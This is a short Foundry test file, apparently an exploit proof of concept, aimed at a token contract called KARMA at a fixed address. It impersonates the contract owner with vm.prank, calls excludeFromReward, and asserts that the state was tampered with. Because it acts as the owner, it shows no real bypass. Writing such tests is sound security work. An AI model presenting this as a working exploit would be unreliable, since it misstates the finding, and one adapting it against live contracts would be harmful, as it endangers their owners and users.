pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface KARMA {
    function owner() external view returns (address);
    function excludeFromReward(address account) external;
    function isExcludedFromReward(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x8F9bA08Cbf014aB233A33067B21bEdF3876c6605;
    address attacker = address(this);
    KARMA private target;
    address private owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = KARMA(TARGET);
        owner = target.owner();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.prank(owner);
        target.excludeFromReward(owner);
        assertEq(target.isExcludedFromReward(owner), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

